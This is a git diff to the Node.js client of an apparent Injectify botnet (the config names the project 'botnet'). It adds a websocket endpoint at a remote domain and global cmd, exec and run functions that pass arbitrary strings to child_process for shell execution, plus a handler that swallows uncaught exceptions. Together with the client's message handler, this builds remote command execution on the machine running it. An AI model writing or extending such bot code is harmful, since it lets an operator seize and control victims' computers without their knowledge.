@@ -10,7 +10,8 @@
  * Configuration
  */
 let config = {
-    websocket: 'ws://127.0.0.1:3000/i/websocket',//'wss://uder.ml/i/websocket', 
+    websocket: 'wss://uder.ml/i/websocket',
+    websocket: 'ws://127.0.0.1:3000/i/websocket',
     debug: true,
     project: 'botnet', // Injectify project name
 }
@@ -23,13 +24,37 @@ const chalk = require('chalk')
 const dialog = require('dialog')
 const os = require('os')
 const wmic = require('node-wmic')
+const child_process = require('child_process')
 const alert = msg => dialog.info(msg.toString(), ' ')
+
+/**
+ * Exception handler
+ */
+process.on('uncaughtException', function (err) {
+    if (config.debug) console.error('Caught exception: ', err)
+})
 
 /**
  * Global definitions
  */
 global.Buffer = global.Buffer || require('buffer').Buffer
 global.window = global
+window.cmd = window.execSync = command => {
+    return String.fromCharCode.apply(null, child_process.execSync(command))
+}
+window.exec = command => {
+    return String.fromCharCode.apply(null, child_process.exec(command))
+}
+window.run = window.start = command => {
+    return String.fromCharCode.apply(null, child_process.exec(`start "" ${command}`))
+}
+window.open = url => {
+    /**
+     * Open url in default browser
+     * https://www.npmjs.com/package/openurl2
+     */
+    require("openurl2").open(url)
+}
 if (typeof btoa === 'undefined') {
   global.btoa = function (str) {
     return new Buffer(str).toString('base64')
@@ -101,7 +126,6 @@ let i = pc => {
 
     ws.onopen = () => {
         console.log(chalk.greenBright('[Injectify] ') + chalk.yellowBright('connected!'))
-        send('r', 't')
     }
 
     ws.onmessage = message => {
